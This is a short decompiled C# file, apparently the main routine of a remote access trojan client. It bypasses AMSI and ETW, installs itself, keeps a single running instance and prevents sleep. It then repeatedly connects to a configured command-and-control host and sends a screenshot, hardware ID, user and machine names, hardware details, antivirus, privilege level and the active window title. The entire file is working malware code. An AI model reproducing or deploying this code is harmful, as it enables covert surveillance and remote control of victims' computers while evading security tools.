using System;
using System.Threading;
using Client.Helper;
using Leb128;

namespace Client
{
	// Token: 0x02000003 RID: 3
	internal class Program
	{
		public static Helper.Client client = new Helper.Client();
		private static void Main(string[] args)
		{
			try
			{
				Config.Init();
				AsmiAndETW.Bypass();
				if (Config.Install == EncryptString.Decode("true"))
				{
					Install.Run();
				}
				if (MutexControl.CreateMutex(Config.Mutex))
				{
					Methods.MaxPriority();
					Methods.PreventSleep();
					for (;;)
					{
						if (!Program.client.itsConnect)
						{
							string[] array = Config.Hosts.Split(new char[]
							{
								';'
							});
							string[] array2 = array[Methods.random.Next(array.Length)].Split(new char[]
							{
								':'
							});
							string[] array3 = array2[1].Split(new char[]
							{
								','
							});
							Program.client.Disconnect();
							Program.client.Connect(array2[0], array3[Methods.random.Next(array3.Length)]);
							if (Program.client.itsConnect)
							{
								Program.client.pingChecker = new PingChecker(Program.client);
								Program.client.lastPing = new LastPing(Program.client);
								Program.client.Send(LEB128.Write(new object[]
								{
									EncryptString.Decode("Connect"),
									Methods.CaptureResizeReduceQuality(),
									Config.Group,
									Config.Hwid,
									Environment.UserName + EncryptString.Decode(" @ ") + Environment.MachineName,
									Config.Camera,
									Config.Cpu,
									Config.Gpu,
									Config.WindowsVersion,
									Config.AntiVirus,
									Config.Version,
									Config.DataInstall,
									Config.Privilege,
									Methods.GetActiveWindowTitle()
								}));
							}
						}
						Thread.Sleep(200);
					}
				}
			}
			catch
			{
			}
		}		
	}
}
